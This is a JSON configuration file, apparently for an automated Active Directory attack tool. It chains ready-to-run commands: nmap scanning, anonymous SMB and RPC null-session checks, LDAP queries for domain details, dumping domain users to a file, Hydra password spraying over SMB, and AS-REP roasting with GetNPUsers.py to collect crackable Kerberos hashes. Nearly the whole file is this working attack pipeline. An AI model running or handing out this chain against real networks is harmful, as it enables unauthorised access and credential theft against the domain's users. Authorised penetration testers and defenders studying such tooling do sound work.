{
    "nmap": {
        "name": "nmap",
        "cmd": "nmap -v -Pn {ip}",
        "patterns": [
            {
                "Discovered open port (445|139)": [
                    "SMB_SERVICE_FOUND",
                    "RPC_SERVICE_FOUND"
                ]
            },
            {
                "Discovered open port (389)": [
                    "LDAP_SERVICE_FOUND"
                ]
            }
        ]
    },
    "smbclient-anonymous": {
        "name": "smbclient-anonymous",
        "cmd": "smbclient -U ''%'' \\\\\\\\{ip}\\\\IPC$ -c 'AZERTY;q'",
        "patterns": [
            {
                "AZERTY: command not found": [
                    "SMB_ACCESS"
                ]
            }
        ]
    },
    "ldap-base": {
        "name": "ldap-base",
        "cmd": "ldapsearch -LLL -x -h {ip} -s base",
        "store": [
            {
                "domain_name": "ldapServiceName: .*\\@(.*)$"
            },
            {
                "dc_dns": "dnsHostName: (.*?)$"
            },
            {
                "domain_dn": "rootDomainNamingContext: (.*?)$"
            }
        ],
        "patterns": [
            {
                "rootDomainNamingContext: DC=.*$": [
                    "LDAP_DOMAIN_CONTROLLER"
                ]
            }
        ]
    },
    "ldap-anonymous-dc": {
        "name": "ldap-anonymous-dc",
        "cmd": "ldapsearch -LLL -x -h {ip} -b '{domain_dn}' > {output_dir}ldap-anonymous-dc.txt",
        "store_static": [
            {
                "ldap_dc_output_file": "{output_dir}ldap-anonymous-dc.txt"
            }
        ]
    },
    "rpc-anonymous": {
        "name": "rpc-anonymous",
        "cmd": "rpcclient -U ''%'' {ip} -c 'AZERTY;quit 2>/dev/null'",
        "patterns": [
            {
                "command not found: AZERTY": [
                    "RPC_ACCESS"
                ]
            }
        ]
    },
    "rpc-list-users": {
        "name": "rpc-list-users",
        "cmd": "rpcclient -U ''%'' {ip} -c 'enumdomusers;quit' 2>/dev/null | cut -d[ -f2 | cut -d] -f1 > {output_dir}rpc-users.lst; [ -s {output_dir}rpc-users.lst ] && echo 'USERS FOUND'",
        "store_static": [
            {
                "users_file": "{output_dir}rpc-users.lst"
            }
        ],
        "patterns": [
            {
                "USERS FOUND": [
                    "RPC_USER_LIST"
                ]
            }
        ]
    },
    "hydra-nsr-spraying": {
        "name": "hydra-nsr-spraying",
        "cmd": "hydra -L {users_file} -e nsr smb://{ip}"
    },
    "asreproast": {
        "name": "asreproast",
        "cmd": "GetNPUsers.py {domain_name}\/ -usersfile {users_file} -no-pass -dc-ip {ip} -outputfile {output_dir}asreproast.hash; [ -s {output_dir}asreproast.hash ] && echo 'TGT FOUND'",
        "store_static": [
            {
                "asreproast_hashes": "{output_dir}asreproast.hash"
            }
        ],
        "patterns": [
            {
                "TGT FOUND": [
                    "USER_TGT_FOUND"
                ]
            }
        ]       
    }
}

